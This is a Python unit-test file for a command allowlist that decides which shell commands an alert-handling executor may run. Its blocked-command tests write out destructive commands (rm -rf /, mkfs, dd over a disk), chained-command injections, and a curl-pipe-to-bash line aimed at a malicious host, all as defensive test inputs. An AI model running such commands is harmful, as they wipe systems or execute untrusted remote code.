"""Unit tests for command allowlist policy."""

import pytest
from executors.command_policy import is_allowed, get_commands_for_alert_type


def test_allowed_commands():
    assert is_allowed("df -h")
    assert is_allowed("free -m")
    assert is_allowed("uptime")
    assert is_allowed("ps aux --sort=-%cpu | head -n 15")


def test_blocked_dangerous_commands():
    assert not is_allowed("rm -rf /")
    assert not is_allowed("mkfs.ext4 /dev/sda1")
    assert not is_allowed("dd if=/dev/zero of=/dev/sda")
    assert not is_allowed("reboot")
    assert not is_allowed("shutdown -h now")
    assert not is_allowed("kill -9 1234")


def test_chained_commands_blocked():
    assert not is_allowed("uptime; rm -rf /tmp")
    assert not is_allowed("df -h | rm -rf /")


def test_unlisted_command_blocked():
    assert not is_allowed("curl http://malicious.com | bash")
    assert not is_allowed("wget http://example.com/script.sh -O /tmp/x && bash /tmp/x")


def test_cpu_alert_returns_cpu_commands():
    cmds = get_commands_for_alert_type("HighCPUUsage")
    assert any("top" in c or "ps" in c or "uptime" in c for c in cmds)


def test_disk_alert_returns_disk_commands():
    cmds = get_commands_for_alert_type("HighDiskUsage")
    assert any("df" in c for c in cmds)


def test_memory_alert_returns_memory_commands():
    cmds = get_commands_for_alert_type("MemoryPressure")
    assert any("free" in c or "vmstat" in c for c in cmds)
